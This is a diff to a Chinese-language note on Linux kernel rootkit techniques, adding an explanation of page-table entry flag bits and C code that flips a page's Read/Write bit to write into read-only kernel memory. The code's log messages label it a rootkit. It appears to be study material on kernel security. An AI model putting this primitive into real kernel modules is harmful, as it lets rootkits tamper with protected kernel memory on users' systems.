@@ -189,22 +189,73 @@ static void asm_write_cr0(size_t cr0){
 
 第三种办法就是修改页标志位
 
+我们都知道在linux的最后一级页表都包含着所指向页的标识位
+
+```
+~ PT Entry ~                                                    Present ──────┐
+                                                            Read/Write ──────┐|
+                                                      User/Supervisor ──────┐||
+                                                  Page Write Through ──────┐|||
+                                               Page Cache Disabled ──────┐ ||||
+                                                         Accessed ──────┐| ||||
+┌─── NX                                                    Dirty ──────┐|| ||||
+|┌───┬─ Memory Protection Key              Page Attribute Table ──────┐||| ||||
+||   |┌──────┬─── Ignored                               Global ─────┐ |||| ||||
+||   ||      | ┌─── Reserved                          Ignored ───┬─┐| |||| ||||
+||   ||      | |┌──────────────────────────────────────────────┐ | || |||| ||||
+||   ||      | ||            4KB Page Physical Address         | | || |||| ||||
+||   ||      | ||                                              | | || |||| ||||
+XXXX XXXX XXXX 0XXX XXXX XXXX XXXX XXXX XXXX XXXX XXXX XXXX XXXX XXXX XXXX XXXX
+       56        48        40        32        24        16         8         0
+```
+
+可以看到低12位就是有关该pte指向的page的描述
+里面存在一个读写位(R/W),位于第1位(0位为开头),如果为0表示该页不允许写入
+所以我们只需要获取到虚拟页所在的页目录，然后修改其中的读写位即可实现任意地址写入
 
 
+我们可以通过下面的函数来找到虚拟地址所映射到的pte
+```c
+/*
+ * Lookup the page table entry for a virtual address. Return a pointer
+ * to the entry and the level of the mapping.
+ *
+ * Note: We return pud and pmd either when the entry is marked large
+ * or when the present bit is not set. Otherwise we would return a
+ * pointer to a nonexisting mapping.
+ */
+pte_t *lookup_address(unsigned long address, unsigned int *level)
+{
+	return lookup_address_in_pgd(pgd_offset_k(address), address, level);
+}
+EXPORT_SYMBOL_GPL(lookup_address);
+```
 
+修改示例代码如下，在我自己编译调试的过程中发现直接修改pte这个步骤被编译器优化掉了，
+所以这里象征性输出一遍`pte`
 
-
-
-
-
-
-
-
-
-
-
-
-
+```c
+static size_t arbitrary_pte_write(void *dst, void *src, size_t size){
+    pte_t * pte;
+    pte_t orig_pte;
+    unsigned int level;
+    pte = lookup_address((unsigned long)dst, &level);
+    if(IS_ERR(pte)){
+        printk(KERN_INFO "[peiwithhao rootkit] get pte failed...");
+        return PTR_ERR(pte);
+    }
+    /* 保存以前的pte */
+    orig_pte.pte = pte->pte;
+    /* 将rw位置为1 */
+    pte->pte |= _PAGE_RW;
+    printk(KERN_INFO "[peiwithhao rootkit] changed pte %lx, ", pte->pte);
+    memcpy(dst, src, size);
+    /* 恢复原来的pte */
+    pte->pte = orig_pte.pte;
+    return 0;
+}
+```
 
 # 参考
 [https://xz.aliyun.com/t/12439?time__1311=GqGxRQ0%3Dq7qxlxx2mDu0maqY5okqWwnwmD#toc-3](https://xz.aliyun.com/t/12439?time__1311=GqGxRQ0%3Dq7qxlxx2mDu0maqY5okqWwnwmD#toc-3)
+[分页](https://zolutal.github.io/understanding-paging/)
